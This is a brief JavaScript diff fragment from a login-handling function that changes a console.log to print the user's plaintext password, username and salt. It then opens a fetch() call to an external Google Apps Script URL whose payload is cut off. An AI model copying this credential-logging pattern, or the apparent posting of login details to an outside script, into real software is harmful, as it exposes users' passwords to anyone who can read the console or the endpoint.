@@ -106,7 +106,11 @@ setTimeout(function () {
 }
 function getuserdetails(user,pass,salt){
     var formDataString =user;
-    console.log(formDataString)
+    console.log(JSON.stringify({
+                password: pass,
+                user: user,
+                salt: salt
+        }))
 
     fetch(
       "https://script.google.com/macros/s/AKfycbw6HLM5MbrYYq6uotXraXc9JvSlfAVRlU9Ynbh_9nHQiKBJ--E9tAhOBjVQZeWthwSd/exec",
